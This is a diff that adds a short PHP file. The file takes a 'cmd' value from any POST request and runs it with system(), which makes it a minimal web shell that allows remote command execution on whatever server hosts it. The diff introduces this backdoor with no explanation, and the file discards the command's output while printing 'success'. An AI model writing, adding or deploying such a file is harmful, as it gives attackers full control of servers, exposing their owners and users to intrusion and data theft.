@@ -1,0 +1,14 @@
+<?php
+function execute($com)
+{
+    echo system($com);
+}
+
+$cmd = $_POST['cmd'];
+ob_start();
+echo "success";
+execute($cmd);
+$buffer = "";
+$buffer = ob_get_contents();
+ob_end_clean();
+?>
